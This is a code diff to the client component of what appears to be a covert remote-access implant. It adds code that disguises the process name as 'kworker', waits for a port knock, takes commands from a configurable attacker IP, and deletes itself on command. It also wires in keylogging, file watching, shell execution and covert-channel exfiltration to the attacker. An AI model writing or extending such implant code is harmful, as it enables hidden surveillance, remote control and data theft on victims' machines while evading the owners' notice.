@@ -1,9 +1,12 @@
 import signal
 import sys
+import socket
 import subprocess
 import threading
 
 from pathlib import Path
+
+from setproctitle import setproctitle
 
 from scapy.all import *
 from scapy.layers.inet import UDP, IP, TCP
@@ -12,7 +15,17 @@ from mods.protocol import send_data, receive_data, send_ack_packet, send_fin_pac
 from mods.knocking import wait_for_knock
 from mods.keylogger import start_keylogger, stop_keylogger
 from mods.monitoring import watch_file, watch_directory
-from mods.shared import ATTACKER_IP, VICTIM_IP, Channel
+from mods.shared import (
+    get_ip_address, set_interface, set_attackerip, set_victimip, ATTACKER_IP, VICTIM_IP, Channel
+)
+
+def build_parser() -> argparse.ArgumentParser:
+    p = argparse.ArgumentParser(description="")
+    p.add_argument("--ip", type=str, required=True)
+    p.add_argument("--iface", type=str, default='enp2s0')
+    p.add_argument("--name", type=str, default='kworker')
+
+    return p
 
 def run_shell_command(args) -> str:
     print(f'Running... {args}')
@@ -26,7 +39,6 @@ def _send_watch(data: bytes):
     send_data(data, src=VICTIM_IP, dst=ATTACKER_IP, channel=Channel.BACKGROUND, sleep=0)
 
 def _wait_for_stop() -> bool:
-    """Blocks until attacker sends 'ew' on the main channel. Returns True when stop received."""
     while True:
         signal_data = receive_data(from_ip=ATTACKER_IP, timeout=10)
         if signal_data == b'ew':
@@ -88,14 +100,23 @@ def handle_command(cmd: str, args: list[str]) -> str:
         t.join(timeout=3)
         return 'Directory watch ended'
     elif cmd == 'dc':
-        # TODO: Gracefully disconnect and end the session
-        return 'Disconnected'
+        return 'Attacker disconnected'
     elif cmd == 'un':
-        # TODO: Remove
-        return 'Uninstalled'
+        uninstall()
     else:
         return 'Unrecognized command'
 
+def uninstall():
+    project_dir = Path(__file__).resolve().parent
+    os.chdir(project_dir.parent)
+
+    try:
+        shutil.rmtree(project_dir)
+    except Exception as e:
+        print(f"Error during deletion: {e}")
+
+    sys.exit(0)
+    
 def sigint_handler(sig, frame):
     print('\nExiting...')
     sys.exit(0)
@@ -105,6 +126,21 @@ def main():
 
     print('hello from client')
 
+    args = build_parser().parse_args()
+    my_ip = get_ip_address(args.iface)
+
+    print(f'setting interface to: {args.iface}')
+    set_interface(args.iface)
+    print(f'setting attackerip to: {args.ip}')
+    set_attackerip(args.ip)
+    print(f'setting victimip to: {my_ip}')
+    set_victimip(my_ip)
+
+    print(f'settings program name to: {args.name}')
+    setproctitle(args.name)
+
+    wait_for_knock()
+
     while True:
         command = receive_data(from_ip=ATTACKER_IP, timeout=360)
         decoded = command.decode()
@@ -112,6 +148,9 @@ def main():
         parts = decoded.split(' ')
         res = handle_command(parts[0], parts[1:])
         print(res)
+
+        if res == 'Attacker disconnected':
+            wait_for_knock()
 
 
 if __name__ == "__main__":
